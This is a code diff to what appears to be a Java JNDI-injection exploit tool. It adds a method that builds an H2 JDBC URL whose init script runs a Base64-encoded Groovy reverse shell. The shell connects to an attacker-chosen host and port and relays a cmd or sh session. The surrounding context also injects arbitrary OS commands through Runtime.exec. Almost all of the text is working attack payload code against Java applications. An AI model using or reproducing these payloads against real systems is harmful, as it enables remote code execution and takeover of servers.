@@ -13,6 +13,7 @@ import map.jndi.util.MiscUtil;
 import map.jndi.util.ReflectUtil;
 
 import java.util.ArrayList;
+import java.util.Base64;
 import java.util.List;
 import java.util.Properties;
 
@@ -136,6 +137,44 @@ public abstract class DatabaseController implements Controller {
         System.out.println("[H2] [Groovy] [Command] Cmd: " + cmd);
 
         String groovy = "@groovy.transform.ASTTest(value={ assert java.lang.Runtime.getRuntime().exec(System.getProperty(\"os.name\").toLowerCase().contains(\"win\") ? new String[]{\"cmd.exe\", \"/c\", \"COMMAND\"} : new String[]{\"sh\", \"-c\", \"COMMAND\"}) }) def x".replace("COMMAND", cmd);
+        String url = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE ALIAS T5 AS '" + groovy + "'";
+
+        Properties props = new Properties();
+        props.setProperty("driver", "org.h2.Driver");
+        props.setProperty("url", url);
+
+        return props;
+    }
+
+    @JNDIMapping("/H2/Groovy/ReverseShell/{host}/{port}")
+    public Properties h2GroovyReverseShell(String host, String port) {
+        System.out.println("[H2] [Groovy] [ReverseShell] Host: " + host + " Port: " + port);
+
+        String payload = "try {\n" +
+                "def shell=System.properties['os.name'].toLowerCase().contains('win') ? 'cmd' : 'sh'\n" +
+                "def process=new ProcessBuilder(shell).redirectErrorStream(true).start()\n" +
+                "def socket=new java.net.Socket('" + host + "', " + port + ")\n" +
+                "def pi=process.inputStream\n" +
+                "def pe=process.errorStream\n" +
+                "def si=socket.inputStream\n" +
+                "def po=process.outputStream\n" +
+                "def so=socket.outputStream\n" +
+                "while (!socket.isClosed()) {\n" +
+                "while (pi.available() > 0) so.write(pi.read())\n" +
+                "while (pe.available() > 0) so.write(pe.read())\n" +
+                "while (si.available() > 0) po.write(si.read())\n" +
+                "so.flush()\n" +
+                "po.flush()\n" +
+                "Thread.sleep(50)\n" +
+                "try {\n" +
+                "process.exitValue()\n" +
+                "break\n" +
+                "} catch (ignored) {}\n" +
+                "}\n" +
+                "process.destroy()\n" +
+                "socket.close()\n" +
+                "} catch (Exception ignored) {}\n";
+        String groovy = "@groovy.transform.ASTTest(value={ assert new GroovyShell().evaluate(new String(java.util.Base64.getDecoder().decode(\"" + Base64.getEncoder().encodeToString(payload.getBytes())  + "\"))) }) def x";
         String url = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE ALIAS T5 AS '" + groovy + "'";
 
         Properties props = new Properties();
